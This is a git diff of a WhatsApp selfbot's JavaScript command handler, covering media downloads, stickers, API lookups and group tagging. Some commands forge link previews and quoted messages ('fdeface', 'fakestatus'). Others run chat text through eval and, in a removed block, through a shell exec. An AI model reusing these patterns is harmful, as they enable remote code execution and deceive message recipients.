-				sendMediaURL(from, `https://bx-hunter.herokuapp.com/api/flamingtext/warrior?text=${arg}&apikey=${HunterApi}`)
-				break
-				case 'numbers':
-				if (args.length < 1) return reply('the numbers?')
-				var teks = body.slice(13)
-				anu = await fetchJson(`https://bx-hunter.herokuapp.com/api/bilangangka?angka=${teks}&apikey=${HunterApi}`, {method: 'get'})
-				kata = anu.result
-				reply(kata)
-				break
-				case 'pantun':
-				anu = await fetchJson(`https://bx-hunter.herokuapp.com/api/pantun?apikey=${HunterApi}`, {method: 'get'})
-				kata = anu.result
-			reply(kata)
-			break
-			
-  	case 'namemeaning':	
-  	  reply(mess.wait)
-  rival = await fetchJson(`https://bx-hunter.herokuapp.com/api/artinama?nama=${args[0]}&apikey=${HunterApi}`, {method:'get'})
-  slur = rival.result
-   reply(slur)
-   break
-case 'waifu':
-          case 'loli':
-          case 'husbu':
-          case 'milf':
-          case 'cosplay':
-          case 'wallml':
-              let wipu = (await axios.get(`https://raw.githubusercontent.com/Arya-was/endak-tau/main/${command}.json`)).data
-              let wipi = wipu[Math.floor(Math.random() * (wipu.length))]
-              fs.writeFileSync(`./${sender}.jpeg`, await getBuffer(wipi))
-		      buttons = [{buttonId: `${prefix + command}`,buttonText:{displayText: `➡️Next`},type:1},{buttonId:`${prefix}owner`,buttonText:{displayText:'🐤OWNER'},type:1}]
-              imageMsg = ( await itsmevall.prepareMessage(from, fs.readFileSync(`./${sender}.jpeg`), 'imageMessage', {thumbnail: Buffer.alloc(0)})).message.imageMessage
-              buttonsMessage = {footerText:'Dont forget to donate bro ☕', imageMessage: imageMsg,
-              contentText:`Click Next to go to the next picture`,buttons,headerType:4}
-              prep = await itsmevall.prepareMessageFromContent(from,{buttonsMessage},{quoted: mek})
-              itsmevall.relayWAMessage(prep)
-              fs.unlinkSync(`./${sender}.jpeg`)
-              break
-   case'lyricssong':
-     reply(mess.wait)
-  apa = await fetchJson(`https://bx-hunter.herokuapp.com/api/music/liriklagu?query=${args[0]}&apikey=${HunterApi}`,{method:'get'})
-  apa2 = apa.result
-  reply(apa2)
-  break
-case 'attp':
-					if (!c) return reply(`Where is the text, Bro?\nExample :\n${prefix}attp ${fakeyoi}`)
-					atetepe = await getBuffer(`https://api.xteam.xyz/attp?file&text=${encodeURIComponent(c)}`)
-					itsmevall.sendMessage(from, atetepe, sticker, { quoted: mek })
-					break
-				case 'recipes':
-				if (args.length < 1) return reply('The title?')
-				var teks = body.slice(14)
-				anu = await fetchJson(`https://bx-hunter.herokuapp.com/api/resepmakanan?query=${teks}&apikey=${HunterApi}`, {method: 'get'})
-					hasilresep = `❏ *${anu.results.title}*\n\n❏ Portion : ${anu.results.servings}\n❏ Time : ${anu.results.times}\n❏ Difficulty : ${anu.results.dificulty}\n❏  User : ${anu.results.author.user}\n❏ Publish Date : ${anu.results.author.datePublished}\n❏ description : ${anu.results.desc}\n\n────────────────────\n❏ *Tutorial*\n\n❏ Ingredients : ${anu.results.ingredient}\n❏ Step : ${anu.results.step}`
-					reply(mess.wait)
-					buff = await getBuffer(anu.results.thumb)
-					itsmevall.sendMessage(from, buff, image, {quoted: ftok, caption: hasilresep})
-					break 
-					case 'githubstalk':
-					if (args.length < 1) return reply('Username?')
-					var teks = body.slice(13)
-					anu = await fetchJson(`https://bx-hunter.herokuapp.com/api/stalk/github?user=${teks}&apikey=${HunterApi}`, {method: 'get'})
-					gstalk = `❏ *GITHUB STALK*\n\n❏ Name : ${anu.result.name}\n❏ Followers : ${anu.result.followers}\n❏ Following : ${anu.result.following}\n❏ Id : ${anu.result.id}\n❏ Node Id : ${anu.result.node_id}\n❏ Type : ${anu.result.type}\n❏ Company : ${anu.result.company}\n❏ Location : ${anu.result.location}\n❏ Bio : ${anu.result.bio}\n❏ Site Admin : ${anu.result.site_admin}\n❏ Email : ${anu.result.email}\n❏ Created At : ${anu.result.created_at}\n❏ Updated At : ${anu.result.updated_at}\n❏ Twitter Username : ${anu.result.twitter_username}\n❏ Blog : ${anu.result.blog}\n❏ Avatar Url : ${anu.result.avatar_url}\n❏ Gravatar Id : ${anu.result.gravatar_id}\n❏ Html Url : ${anu.result.html_url}`
-					reply(mess.wait)
-					buff = await getBuffer(anu.result.avatar_url)
-					itsmevall.sendMessage(from, buff, image, {quoted: ftok, caption: gstalk})
-					break 
-					case 'earthquakeinfo':
-					anu = await fetchJson(`https://bx-hunter.herokuapp.com/api/info/gempa?apikey=${HunterApi}`, {method: 'get'})
-					gempa = `❏ *EARTHQUAKE INFO*\n\n❏ Time : ${anu.result.Waktu}\n❏ Latitude : ${anu.result.Lintang}\n❏ longitude : ${anu.result.Bujur}\n❏ Magnitude : ${anu.result.Magnitudo}\n❏ Depth : ${anu.result.Kedalaman}\n❏ Region : ${anu.result.Wilayah}`
-					reply(mess.wait)
-					buff = await getBuffer(anu.result.Map)
-					itsmevall.sendMessage(from, buff, image, {quoted: ftok, caption: gempa})
-					break 
       case "contact":
         pe = args.join(" ");
         entah = pe.split("|")[0];
@@ -3675,41 +2908,25 @@ case 'attp':
           `FN:${nah}\n` +
           `TEL;type=CELL;type=VOICE;waid=${entah}:${phoneNum(
             "+" + entah
-          ).getNumber("internasional")}\n` +
+          ).getNumber("international")}\n` +
           "END:VCARD".trim();
-        itsmevall.sendMessage(
+        client.sendMessage(
           from,
           { displayName: `${nah}`, vcard: vcard },
           contact
         );
         break;
-case "antidelete":
-if (!isOwner && !itsMe) return
-if (args.length < 1) return reply('Choose on or off')
-if (args[0] === "on") {
-if(antidel)return reply('Its been activated before!')
-antidel = true
-reply(`Success activate antidelete`)
-} else if (args[0] === "off") {
-if(!antidel)return reply('Its been deactivated before!')
-antidel = false
-reply(`Success turn off antidelete`)
-} else {
-reply(`Choose on or off`)
-}
-break;
-                
       case "take":
       case "colong":
-        if (!isQuotedSticker) return reply("Just a sticker");
+        if (!isQuotedSticker) return reply("Sticker ko reply kar na ve noobde😑");
         encmedia = JSON.parse(JSON.stringify(mek).replace("quotedM", "m"))
           .message.extendedTextMessage.contextInfo;
-        media = await itsmevall.downloadAndSaveMediaMessage(encmedia);
+        media = await client.downloadAndSaveMediaMessage(encmedia);
         anu = args.join(" ").split("|");
         satu = anu[0] !== "" ? anu[0] : `SELF`;
         dua = typeof anu[1] !== "undefined" ? anu[1] : `BOT`;
         require("./lib/fetcher.js").createExif(satu, dua);
-        require("./lib/fetcher.js").modStick(media, itsmevall, mek, from);
+        require("./lib/fetcher.js").modStick(media, client, mek, from);
         break;
       case "stikerwm":
       case "stickerwm":
@@ -3722,13 +2939,13 @@ break;
             ? JSON.parse(JSON.stringify(mek).replace("quotedM", "m")).message
                 .extendedTextMessage.contextInfo
             : mek;
-          media = await itsmevall.downloadAndSaveMediaMessage(encmedia);
+          media = await client.downloadAndSaveMediaMessage(encmedia);
           await createExif(a, b);
           out = getRandom(".webp");
           ffmpeg(media)
             .on("error", (e) => {
               console.log(e);
-              itsmevall.sendMessage(from, "There is an error", "conversation", {
+              client.sendMessage(from, "There is an error", "conversation", {
                 quoted: mek,
               });
               fs.unlinkSync(media);
@@ -3743,7 +2960,7 @@ break;
                 "-o",
                 _out,
               ]).on("exit", () => {
-                itsmevall.sendMessage(
+                client.sendMessage(
                   from,
                   fs.readFileSync(_out),
                   "stickerMessage",
@@ -3773,7 +2990,7 @@ break;
             ? JSON.parse(JSON.stringify(mek).replace("quotedM", "m")).message
                 .extendedTextMessage.contextInfo
             : mek;
-          const media = await itsmevall.downloadAndSaveMediaMessage(encmedia);
+          const media = await client.downloadAndSaveMediaMessage(encmedia);
           pe = args.join("");
           var a = pe.split("|")[0];
           var b = pe.split("|")[1];
@@ -3782,7 +2999,7 @@ break;
           ffmpeg(media)
             .on("error", (e) => {
               console.log(e);
-              itsmevall.sendMessage(from, "There is an error", "conversation", {
+              client.sendMessage(from, "There is an error", "conversation", {
                 quoted: mek,
               });
               fs.unlinkSync(media);
@@ -3797,7 +3014,7 @@ break;
                 "-o",
                 _out,
               ]).on("exit", () => {
-                itsmevall.sendMessage(
+                client.sendMessage(
                   from,
                   fs.readFileSync(_out),
                   "stickerMessage",
@@ -3818,14 +3035,14 @@ break;
             .save(out);
         } else {
           reply(
-            `Send a picture with a caption ${prefix}swm text|text or image tags that have been sent`
+            `Send an image with the caption ${prefix}swm text|text or image tag that has already been sent`
           );
         }
         break;
-      case "upswteks":
-        if (!q) return fakestatus("Fill in the text!");
-        itsmevall.sendMessage("status@broadcast", `${q}`, extendedText);
-        fakegroup(`Success Up story wea text ${q}`);
+      case "upswtxts":
+        if (!q) return fakestatus("The text?!");
+        client.sendMessage("status@broadcast", `${q}`, extendedText);
+        fakegroup(`Sukses Up story wea teks ${q}`);
         break;
       case "upswimage":
         if (isQuotedImage) {
@@ -3833,12 +3050,12 @@ break;
             ? JSON.parse(JSON.stringify(mek).replace("quotedM", "m")).message
                 .extendedTextMessage.contextInfo
             : mek;
-          cihcih = await itsmevall.downloadMediaMessage(swsw);
-          itsmevall.sendMessage("status@broadcast", cihcih, image, {
+          cihcih = await client.downloadMediaMessage(swsw);
+          client.sendMessage("status@broadcast", cihcih, image, {
             caption: `${q}`,
           });
-          bur = `Successfully Upload Story Image with Caption: ${q}`;
-          itsmevall.sendMessage(from, bur, text, { quoted: mek });
+          bur = `Successfully Uploaded Story Image with Caption: ${q}`;
+          client.sendMessage(from, bur, text, { quoted: mek });
         } else {
           fakestatus("Reply the picture!");
         }
@@ -3849,14 +3066,14 @@ break;
             ? JSON.parse(JSON.stringify(mek).replace("quotedM", "m")).message
                 .extendedTextMessage.contextInfo
             : mek;
-          cihcih = await itsmevall.downloadMediaMessage(swsw);
-          itsmevall.sendMessage("status@broadcast", cihcih, video, {
+          cihcih = await client.downloadMediaMessage(swsw);
+          client.sendMessage("status@broadcast", cihcih, video, {
             caption: `${q}`,
           });
           bur = `Successfully Upload Story Video with Caption: ${q}`;
-          itsmevall.sendMessage(from, bur, text, { quoted: mek });
+          client.sendMessage(from, bur, text, { quoted: mek });
         } else {
-          fakestatus("Reply the video!");
+          fakestatus("video ko reply kar!");
         }
         break;
       case "fdeface":
@@ -3865,14 +3082,14 @@ break;
         var pen = ge.split("|")[1];
         var pn = ge.split("|")[2];
         var be = ge.split("|")[3];
-        const fde = `send/reply image with capion ${prefix}fdeface link|title|desc|text`;
+        const fde = `send/reply image with caption ${prefix}fdeface link|title|desc|text`;
         if (args.length < 1) return reply(fde);
         const dipes =
           isQuotedSticker || isQuotedImage
             ? JSON.parse(JSON.stringify(mek).replace("quotedM", "m")).message
                 .extendedTextMessage.contextInfo
             : mek;
-        const tipes = await itsmevall.downloadAndSaveMediaMessage(dipes);
+        const tipes = await client.downloadAndSaveMediaMessage(dipes);
         const bufer = fs.readFileSync(tipes);
         const desc = `${pn}`;
         const title = `${pen}`;
@@ -3881,58 +3098,45 @@ break;
         var anu = {
           detectLinks: false,
         };
-        var mat = await itsmevall.generateLinkPreview(url);
+        var mat = await client.generateLinkPreview(url);
         mat.title = title;
         mat.description = desc;
         mat.jpegThumbnail = bufer;
         mat.canonicalUrl = buu;
-        itsmevall.sendMessage(from, mat, MessageType.extendedText, anu);
+        client.sendMessage(from, mat, MessageType.extendedText, anu);
         break;
       case "public":
-        if (!mek.key.fromMe) return replyfakelink("SELF-BOT");
+        if (!mek.key.fromMe) return fakestatus("SELF-BOT");
         if (banChats === false) return;
         // var taged = mek.message.extendedTextMessage.contextInfo.mentionedJid[0]
         banChats = false;
-        replyfakelink(`「 *PUBLIC-MODE* 」`);
+        fakestatus(`「 *PUBLIC-MODE* 」`);
         break;
       case "self":
-        if (!mek.key.fromMe) return replyfakelink("SELF-BOT");
+        if (!mek.key.fromMe) return fakestatus("SELF-BOT");
         if (banChats === true) return;
         uptime = process.uptime();
         // var taged = mek.message.extendedTextMessage.contextInfo.mentionedJid[0]
         banChats = true;
-        replyfakelink(`「 *SELF-MODE* 」`);
+        fakestatus(`「 *SELF-MODE* 」`);
         break;
-                case "hidetag":
-					// source code by xeon
-					if (!isGroup) return reply(mess.only.group);
-					if (!isGroupAdmins) return reply(mess.admin);
-					var value = body.slice(9)
-					var group = await itsmevall.groupMetadata(from)
-					var member = group['participants']
-					var mem = []
-					member.map( async adm => {
-					mem.push(adm.id.replace('c.us', 's.whatsapp.net'))
-					})
-					var options = {
-					text: value,
-					contextInfo: { mentionedJid: mem },
-					quoted: mek
-					}
-					itsmevall.sendMessage(from, options, text)
-					break;
-              case "tagall":
-					if (!isGroup) return reply(mess.only.group);
-					if (!isGroupAdmins) return reply(mess.admin);
-					members_id = []
-					teks = (args.length > 1) ? body.slice(8).trim() : ''
-					teks += '\n\n'
-					for (let mem of groupMembers) {
-						teks += `*~>* @${mem.jid.split('@')[0]}\n`
-						members_id.push(mem.jid)
-					}
-					mentions(teks, members_id, true)
-					break;
+      case "hidetag":
+        if (!mek.key.fromMe) return fakestatus("SELF-BOT");
+        if (!isGroup) return reply(mess.only.group);
+        var value = args.join(" ");
+        var group = await client.groupMetadata(from);
+        var member = group["participants"];
+        var mem = [];
+        member.map(async (adm) => {
+          mem.push(adm.id.replace("c.us", "s.whatsapp.net"));
+        });
+        var optionshidetag = {
+          text: value,
+          contextInfo: { mentionedJid: mem },
+          quoted: mek,
+        };
+        client.sendMessage(from, optionshidetag, text);
+        break;
       case "play":
         if (args.length === 0)
           return reply(
@@ -3952,7 +3156,7 @@ break;
                   return sendMediaURL(
                     from,
                     thumb,
-                    `*PLAY MUSIC*\n\n*Title* : ${title}\n*Ext* : MP3\n*Filesize* : ${filesizeF}\n*Link* : ${a.data}\n\n_For durations more than the limit are presented in the link_`
+                    `*PLAY MUSIC*\n\n*Title* : ${title}\n*Ext* : MP3\n*Filesize* : ${filesizeF}\n*Link* : ${a.data}\n\n_gaane ko mehsoos karen mere dost😌✨_`
                   );
                 const captions = `*PLAY MUSIC*\n\n*Title* : ${title}\n*Ext* : MP3\n*Size* : ${filesizeF}\n*Link* : ${a.data}\n\n_Please wait for the media file to be sent it may take a few minutes_`;
                 sendMediaURL(from, thumb, captions);
@@ -3982,7 +3186,7 @@ break;
                   return sendMediaURL(
                     from,
                     thumb,
-                    `*PLAY VIDEO*\n\n*Title* : ${title}\n*Ext* : MP3\n*Filesize* : ${filesizeF}\n*Link* : ${a.data}\n\n_For durations more than the limit are presented in the link_`
+                    `*PLAY VIDEO*\n\n*Title* : ${title}\n*Ext* : MP3\n*Filesize* : ${filesizeF}\n*Link* : ${a.data}\n\n_Kiya ye sundar hai? 😌✨_`
                   );
                 const captions = `*PLAY VIDEO*\n\n*Title* : ${title}\n*Ext* : MP4\n*Size* : ${filesizeF}\n*Link* : ${a.data}\n\n_Please wait for the media file to be sent it may take a few minutes_`;
                 sendMediaURL(from, thumb, captions);
@@ -4005,7 +3209,7 @@ break;
             ? JSON.parse(JSON.stringify(mek).replace("quotedM", "m")).message
                 .extendedTextMessage.contextInfo
             : mek;
-          const media = await itsmevall.downloadAndSaveMediaMessage(encmedia);
+          const media = await client.downloadAndSaveMediaMessage(encmedia);
           ran = "666.webp";
           await ffmpeg(`./${media}`)
             .input(media)
@@ -4019,7 +3223,7 @@ break;
             })
             .on("end", function () {
               console.log("Finish");
-              itsmevall.sendMessage(from, fs.readFileSync(ran), sticker, {
+              client.sendMessage(from, fs.readFileSync(ran), sticker, {
                 quoted: mek,
               });
               fs.unlinkSync(media);
@@ -4044,7 +3248,7 @@ break;
             ? JSON.parse(JSON.stringify(mek).replace("quotedM", "m")).message
                 .extendedTextMessage.contextInfo
             : mek;
-          const media = await itsmevall.downloadAndSaveMediaMessage(encmedia);
+          const media = await client.downloadAndSaveMediaMessage(encmedia);
           ran = "999.webp";
           reply(mess.wait);
           await ffmpeg(`./${media}`)
@@ -4056,11 +3260,11 @@ break;
               console.log(`Error : ${err}`);
               fs.unlinkSync(media);
               tipe = media.endsWith(".mp4") ? "video" : "gif";
-              reply(`Failed, at the time of converting ${tipe} to sticker`);
+              reply(`Gagal, pada saat mengkonversi ${tipe} ke stiker`);
             })
             .on("end", function () {
               console.log("Finish");
-              itsmevall.sendMessage(from, fs.readFileSync(ran), sticker, {
+              client.sendMessage(from, fs.readFileSync(ran), sticker, {
                 quoted: mek,
               });
               fs.unlinkSync(media);
@@ -4076,22 +3280,22 @@ break;
             .save(ran);
         } else {
           reply(
-            `Send a picture with a caption ${prefix}sticker\nVideo Sticker Duration 1-9 Seconds`
+            `Send an image with the caption ${prefix}sticker\nSticker Video Duration 1-9 Seconds`
           );
         }
         break;
       case "toimg":
         if (!isQuotedSticker) return reply("𝗥𝗲𝗽𝗹𝘆/𝘁𝗮𝗴 𝘀𝘁𝗶𝗰𝗸𝗲𝗿 !");
-        replyfakelink(mess.wait);
+        reply(mess.wait);
         encmedia = JSON.parse(JSON.stringify(mek).replace("quotedM", "m"))
           .message.extendedTextMessage.contextInfo;
-        media = await itsmevall.downloadAndSaveMediaMessage(encmedia);
+        media = await client.downloadAndSaveMediaMessage(encmedia);
         ran = getRandom(".png");
         exec(`ffmpeg -i ${media} ${ran}`, (err) => {
           fs.unlinkSync(media);
           if (err) return reply("Well failed, try again ^_^");
           buffer = fs.readFileSync(ran);
-          fakethumb(buffer, `here bro ${pushname}`);
+          fakethumb(buffer, "Done");
           fs.unlinkSync(ran);
         });
         break;
@@ -4101,7 +3305,7 @@ break;
         try {
           var aramas = await yts(srch);
         } catch {
-          return await itsmevall.sendMessage(
+          return await client.sendMessage(
             from,
             "Error!",
             MessageType.text,
@@ -4127,7 +3331,7 @@ break;
       case "setfake":
         if (!q) return fakegroup(mess.wrongFormat);
         fake = q;
-        fakegroup(`Success Changing Conversation Fake : ${q}`);
+        fakegroup(`Succes Mengganti Conversation Fake : ${q}`);
         break;
       case "setfakeimg":
         if (
@@ -4141,11 +3345,11 @@ break;
               ? JSON.parse(JSON.stringify(mek).replace("quotedM", "m")).message
                   .extendedTextMessage.contextInfo
               : mek;
-          delb = await itsmevall.downloadMediaMessage(boij);
+          delb = await client.downloadMediaMessage(boij);
           fs.writeFileSync(`./stik/fake.jpeg`, delb);
-          replyfakelink("Success");
+          fakestatus("Success");
         } else {
-          reply(`Send a picture with a caption ${prefix}sethumb`);
+          reply(`Send an image with the caption ${prefix}sethumb`);
         }
         break;
       case "setthumb":
@@ -4160,16 +3364,16 @@ break;
               ? JSON.parse(JSON.stringify(mek).replace("quotedM", "m")).message
                   .extendedTextMessage.contextInfo
               : mek;
-          delb = await itsmevall.downloadMediaMessage(boij);
+          delb = await client.downloadMediaMessage(boij);
           fs.writeFileSync(`./stik/thumb.jpeg`, delb);
-          replyfakelink("Success");
+          fakestatus("Success");
         } else {
-          reply(`Send a picture with a caption ${prefix}sethumb`);
+          reply(`Send an image with the caption ${prefix}sethumb`);
         }
         break;
       case "ytmp4":
         if (args.length === 0)
-          return reply(`Send orders *${prefix}ytmp4 [linkYt]*`);
+          return reply(`Kirim perintah *${prefix}ytmp4 [linkYt]*`);
         let isLinks2 = args[0].match(
           /(?:https?:\/{2})?(?:w{3}\.)?youtu(?:be)?\.(?:com|be)(?:\/watch\?v=|\/)([^\s&]+)/
         );
@@ -4185,7 +3389,7 @@ break;
                   return sendMediaURL(
                     from,
                     thumb,
-                    `*YTMP 4!*\n\n*Title* : ${title}\n*Ext* : MP3\n*Filesize* : ${filesizeF}\n*Link* : ${a.data}\n\n_For durations more than the limit are presented in the link_`
+                    `*YTMP 4!*\n\n*Title* : ${title}\n*Ext* : MP3\n*Filesize* : ${filesizeF}\n*Link* : ${a.data}\n\n_Kiya ye sundar hai? 😌✨_`
                   );
                 const captionsYtmp4 = `*Data Successfully Obtained!*\n\n*Title* : ${title}\n*Ext* : MP4\n*Size* : ${filesizeF}\n\n_Please wait for the media file to be sent it may take a few minutes_`;
                 sendMediaURL(from, thumb, captionsYtmp4);
@@ -4197,7 +3401,7 @@ break;
         }
         break;
       case "emoji":
-        if (!q) return fakegroup("the emoji?");
+        if (!q) return fakegroup("emoji kaha hai?");
         qes = args.join(" ");
         emoji.get(`${qes}`).then((emoji) => {
           teks = `${emoji.images[4].url}`;
@@ -4207,7 +3411,7 @@ break;
         break;
       case "ytmp3":
         if (args.length === 0)
-          return reply(`Send orders *${prefix}ytmp3 [linkYt]*`);
+          return reply(`Kirim perintah *${prefix}ytmp3 [linkYt]*`);
         let isLinks = args[0].match(
           /(?:https?:\/{2})?(?:w{3}\.)?youtu(?:be)?\.(?:com|be)(?:\/watch\?v=|\/)([^\s&]+)/
         );
@@ -4223,7 +3427,7 @@ break;
                   return sendMediaURL(
                     from,
                     thumb,
-                    `*Data Successfully Obtained!*\n\n*Title* : ${title}\n*Ext* : MP3\n*Filesize* : ${filesizeF}\n*Link* : ${a.data}\n\n_For durations more than the limit are presented in the link_`
+                    `*Data Successfully Obtained!*\n\n*Title* : ${title}\n*Ext* : MP3\n*Filesize* : ${filesizeF}\n*Link* : ${a.data}\n\n_Is gaane ko mehsoos karen dost😌✨_`
                   );
                 const captions = `*YTMP3*\n\n*Title* : ${title}\n*Ext* : MP3\n*Size* : ${filesizeF}\n\n_Please wait for the media file to be sent it may take a few minutes_`;
                 sendMediaURL(from, thumb, captions);
@@ -4262,7 +3466,7 @@ break;
           for (let Y of res.data) {
             teks += `\n*「 _BRAINLY_ 」*\n\n*➸ Question:* ${Y.pertanyaan}\n\n*➸ Answer:* ${Y.jawaban[0].text}\n❉──────────────────❉\n`;
           }
-          itsmevall.sendMessage(from, teks, text, {
+          client.sendMessage(from, teks, text, {
             quoted: mek,
             detectLinks: false,
           });
@@ -4287,7 +3491,7 @@ break;
         });
         break;
       case "fb":
-        if (!q) return reply("The link?");
+        if (!q) return reply("Link kaha hai?");
         if (!isUrl(args[0]) && !args[0].includes("facebook.com"))
           return reply(mess.Iv);
         reply(mess.wait);
@@ -4311,11 +3515,11 @@ break;
           if (!isUrl(args[0]) && !args[0].includes("whatsapp.com"))
             return reply(mess.Iv);
           hen = args[0];
-          if (!q) return replyfakelink("Enter the group link");
+          if (!q) return fakestatus("Enter the group link");
           var codeInvite = hen.split("https://chat.whatsapp.com/")[1];
           if (!codeInvite) return fakegroup("make sure the link is open!");
-          var response = await itsmevall.acceptInvite(codeInvite);
-          replyfakelink("SUCCESS");
+          var response = await client.acceptInvite(codeInvite);
+          fakestatus("SUCCESS");
         } catch {
           fakegroup("LINK ERROR!");
         }
@@ -4334,7 +3538,7 @@ break;
           const child = stdout.toString("utf-8");
           const ssd = child.replace(/Memory:/, "Ram:");
           const pingnya = `*${ssd}Speed: ${latensi.toFixed(4)} Second*`;
-          replyfakelink(pingnya);
+          fakegroup(pingnya);
         });
         break;
       case "totag":
@@ -4346,12 +3550,12 @@ break;
             ? JSON.parse(JSON.stringify(mek).replace("quotedM", "m")).message
                 .extendedTextMessage.contextInfo
             : mek;
-          file = await itsmevall.downloadAndSaveMediaMessage(
+          file = await client.downloadAndSaveMediaMessage(
             encmedia,
             (filename = getRandom())
           );
           value = args.join(" ");
-          var group = await itsmevall.groupMetadata(from);
+          var group = await client.groupMetadata(from);
           var member = group["participants"];
           var mem = [];
           member.map(async (adm) => {
@@ -4362,7 +3566,7 @@ break;
             quoted: mek,
           };
           ini_buffer = fs.readFileSync(file);
-          itsmevall.sendMessage(from, ini_buffer, sticker, options);
+          client.sendMessage(from, ini_buffer, sticker, options);
           fs.unlinkSync(file);
         } else if (
           ((isMedia && !mek.message.videoMessage) || isQuotedImage) &&
@@ -4372,12 +3576,12 @@ break;
             ? JSON.parse(JSON.stringify(mek).replace("quotedM", "m")).message
                 .extendedTextMessage.contextInfo
             : mek;
-          file = await itsmevall.downloadAndSaveMediaMessage(
+          file = await client.downloadAndSaveMediaMessage(
             encmedia,
             (filename = getRandom())
           );
           value = args.join(" ");
-          var group = await itsmevall.groupMetadata(from);
+          var group = await client.groupMetadata(from);
           var member = group["participants"];
           var mem = [];
           member.map(async (adm) => {
@@ -4388,7 +3592,7 @@ break;
             quoted: mek,
           };
           ini_buffer = fs.readFileSync(file);
-          itsmevall.sendMessage(from, ini_buffer, image, options);
+          client.sendMessage(from, ini_buffer, image, options);
           fs.unlinkSync(file);
         } else if (
           ((isMedia && !mek.message.videoMessage) || isQuotedAudio) &&
@@ -4398,12 +3602,12 @@ break;
             ? JSON.parse(JSON.stringify(mek).replace("quotedM", "m")).message
                 .extendedTextMessage.contextInfo
             : mek;
-          file = await itsmevall.downloadAndSaveMediaMessage(
+          file = await client.downloadAndSaveMediaMessage(
             encmedia,
             (filename = getRandom())
           );
           value = args.join(" ");
-          var group = await itsmevall.groupMetadata(from);
+          var group = await client.groupMetadata(from);
           var member = group["participants"];
           var mem = [];
           member.map(async (adm) => {
@@ -4416,7 +3620,7 @@ break;
             quoted: mek,
           };
           ini_buffer = fs.readFileSync(file);
-          itsmevall.sendMessage(from, ini_buffer, audio, options);
+          client.sendMessage(from, ini_buffer, audio, options);
           fs.unlinkSync(file);
         } else if (
           ((isMedia && !mek.message.videoMessage) || isQuotedVideo) &&
@@ -4426,12 +3630,12 @@ break;
             ? JSON.parse(JSON.stringify(mek).replace("quotedM", "m")).message
                 .extendedTextMessage.contextInfo
             : mek;
-          file = await itsmevall.downloadAndSaveMediaMessage(
+          file = await client.downloadAndSaveMediaMessage(
             encmedia,
             (filename = getRandom())
           );
           value = args.join(" ");
-          var group = await itsmevall.groupMetadata(from);
+          var group = await client.groupMetadata(from);
           var member = group["participants"];
           var mem = [];
           member.map(async (adm) => {
@@ -4443,11 +3647,11 @@ break;
             quoted: mek,
           };
           ini_buffer = fs.readFileSync(file);
-          itsmevall.sendMessage(from, ini_buffer, video, options);
+          client.sendMessage(from, ini_buffer, video, options);
           fs.unlinkSync(file);
         } else {
           reply(
-            `reply image/sticker/audio/video with caption ${prefix}totag`
+            `reply gambar/sticker/audio/video dengan caption ${prefix}totag`
           );
         }
         break;
@@ -4460,12 +3664,12 @@ break;
             ? JSON.parse(JSON.stringify(mek).replace("quotedM", "m")).message
                 .extendedTextMessage.contextInfo
             : mek;
-          owgi = await itsmevall.downloadAndSaveMediaMessage(ger);
+          owgi = await client.downloadAndSaveMediaMessage(ger);
           webp2mp4File(owgi).then((res) => {
             sendMediaURL(from, res.result, "Done");
           });
         } else {
-          replyfakelink("reply stiker");
+          reply("reply stiker");
         }
         fs.unlinkSync(owgi);
         break;
@@ -4481,18 +3685,18 @@ break;
               ? JSON.parse(JSON.stringify(mek).replace("quotedM", "m")).message
                   .extendedTextMessage.contextInfo
               : mek;
-          owgi = await itsmevall.downloadMediaMessage(boij);
+          owgi = await client.downloadMediaMessage(boij);
           res = await upload(owgi);
           reply(res);
         } else {
-          reply("send/reply pictures/videos");
+          reply("kirim/reply gambar/video");
         }
         break;
       case "inspect":
         try {
           if (!isUrl(args[0]) && !args[0].includes("whatsapp.com"))
             return reply(mess.Iv);
-          if (!q) return reply("enter the link wa");
+          if (!q) return reply("enter the link whatsapp");
           cos = args[0];
           var net = cos.split("https://chat.whatsapp.com/")[1];
           if (!net) return reply("make sure its the link https://whatsapp.com/");
@@ -4509,15 +3713,15 @@ break;
             descOwner,
             descTime,
             creation,
-          } = await itsmevall.query({
+          } = await client.query({
             json: ["query", "invite", net],
             expect200: true,
           });
           let par = `*Id* : ${id}
 ${owner ? `*Owner* : @${owner.split("@")[0]}` : "*Owner* : -"}
-*Name Gc* : ${subject}
+*Gc name* : ${subject}
 *Gc created Date* : ${formatDate(creation * 1000)}
-*Number of Members* : ${size}
+*Jumlah Member* : ${size}
 ${desc ? `*Desc* : ${desc}` : "*Desc* : there is not any"}
 *Id desc* : ${descId}
 ${
@@ -4529,7 +3733,7 @@ ${
           }\n\n*Saved contacts*\n`;
           for (let y of participants) {
             par += `> @${y.id.split("@")[0]}\n*Admin* : ${
-              y.isAdmin ? "Yes" : "tidak"
+              y.isAdmin ? "Yes" : "No"
             }\n`;
             jids.push(`${y.id.replace(/@c.us/g, "@s.whatsapp.net")}`);
           }
@@ -4543,7 +3747,7 @@ ${
                 : "-"
             }`
           );
-          itsmevall.sendMessage(from, par, text, {
+          client.sendMessage(from, par, text, {
             quoted: mek,
             contextInfo: { mentionedJid: jids },
           });
@@ -4553,708 +3757,87 @@ ${
         break;
       case "eval":
         if (!mek.key.fromMe) return;
-        itsmevall.sendMessage(
+        client.sendMessage(
           from,
           JSON.stringify(eval(budy.slice(5)), null, "\t"),
           text,
           { quoted: mek }
         );
         break;
-if (!mek.key.fromMe) return;
-if (_chats.startsWith('$')){
-if (!isOwner)return// reply(`This command can not be carried out by rentbot temporarily`)
-if (!q)return 
-var itsme = `${sender}`
-var split = `*itsmevall-BotWeA*`
-const term = {
-contextInfo: {
-participant: itsme,
-quotedMessage: {
-extendedTextMessage: {
-text: split,
-}
-}
-}
-}
-exec(q, (err, stdout) => {
-if (err) return itsmevall.sendMessage(from, ` ${err}`, text, { quoted: mek })
-if (stdout) {
-itsmevall.sendMessage(from, stdout, text, term)
-}
-})
-}
-
       default:
-		if (hour_now >= '02:00' && hour_now <= '04:00') {
-          console.log(color('[Bot Message]', 'cyan'), color('Subscribe Xeon', 'yellow'), color('(😊)', 'white'))
-          }
-        if (hour_now >= '04:00' && hour_now <= '05:00') {
-          console.log(color('[Bot Message]', 'cyan'), color('Subscribe Xeon', 'yellow'), color('(😊)', 'white'))
-          }
-          if (hour_now >= '05:00' && hour_now <= '06:00') {
-          console.log(color('[Bot Message]', 'cyan'), color('Subscribe Xeon', 'yellow'), color('(🙄)', 'white'))
-          }
-        if (hour_now >= '06:00' && hour_now <= '11:00') {
-          console.log(color('[Bot Message]', 'cyan'), color('Susbcribe Xeon', 'yellow'), color('(😅)', 'white'))
-          }
-          if (hour_now >= '11:00' && hour_now <= '12:00') {
